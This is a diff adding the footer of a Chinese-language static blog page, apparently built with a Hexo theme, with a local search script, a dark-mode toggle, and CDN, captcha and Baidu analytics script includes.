+    <a href="https://www.zhihu.com/people/wei-lai-ke-qi-49-69" class="tooltipped" target="_blank" data-tooltip="关注我的知乎: https://www.zhihu.com/people/wei-lai-ke-qi-49-69" data-position="top" data-delay="50">
+        <i class="fab fa-zhihu1">知</i>
+    </a>
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/libs/materialize/materialize.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/libs/aos/aos.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/js/matery.js"></script>
+
+    
+
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="195339201" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+<script>
+    var _hmt = _hmt || [];
+    (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+    
+    <script type="text/javascript" size="150" alpha='0.6'
+        zIndex="-1" src="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/libs/background/ribbon-refresh.min.js" async="async"></script>
+    
+
+    
+
+    
+    <script src="https://cdn.jsdelivr.net/gh/togetherhkl/togetherhkl.github.io/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
